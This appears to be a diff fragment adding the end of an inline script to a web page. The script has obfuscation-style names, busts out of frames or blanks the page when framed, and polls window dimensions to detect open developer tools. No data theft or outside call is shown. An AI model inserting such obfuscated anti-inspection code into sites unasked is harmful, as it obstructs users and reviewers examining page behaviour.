+try{
+if(window.top!==window.self){
+window.top.location=window.self.location;
+}
+}catch(_0xoia){
+document.body.innerHTML='';
+}
+
+var _0xpia=false;
+var _0xqia=160;
+
+function _0xria(){
+var _0xsia=window.outerWidth-window.innerWidth;
+var _0xtia=window.outerHeight-window.innerHeight;
+if(_0xsia>_0xqia||_0xtia>_0xqia){
+_0xpia=true;
+}else{
+_0xpia=false;
+}
+}
+
+setInterval(_0xria,1000);
+
+})();
+</script>
+
+</body>
+</html>
